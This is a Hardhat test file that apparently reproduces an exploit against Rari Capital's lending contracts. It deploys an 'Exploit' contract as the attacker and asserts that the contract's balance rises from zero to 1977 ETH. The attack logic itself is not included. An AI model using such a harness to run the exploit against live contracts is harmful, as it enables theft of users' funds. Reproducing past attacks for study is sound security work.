const { ethers } = require('hardhat');
const { expect } = require('chai');
const erc20_abi = require("../abi/erc20.json");
const cether_delegate_abi = require("../abi/cether_delegate.json")
const cerc20_delegate_abi = require("../abi/cerc20_delegate.json")
const comptroller_abi = require("../abi/comptroller.json")
const vault_abi = require("../abi/vault.json")

describe('[Rari Exploit]', function () {
    let someone, attacker;
    let ethBalance
    let usdcBalance

    before(async function () {
        [someone, attacker] = await ethers.getSigners();

        const factory = await ethers.getContractFactory("Exploit", attacker);
        this.exploit = await factory.deploy()
        await this.exploit.deployed();

        ethBalance = await ethers.provider.getBalance(this.exploit.address);
        console.log("before test ETH balance", ethers.utils.formatUnits(ethBalance, 18));
        
        expect(
            ethers.utils.formatUnits(ethBalance, 18)
        ).to.equal('0.0');
 
    });

    
    it('Exploit', async function () {
        await this.exploit.connect(attacker).exploit();
    });

    after(async function () {
        ethBalance = await ethers.provider.getBalance(this.exploit.address);
        console.log("after test ETH balance", ethers.utils.formatUnits(ethBalance, 18));

        expect(
            ethers.utils.formatUnits(ethBalance, 18)
        ).to.equal('1977.0');
    });
});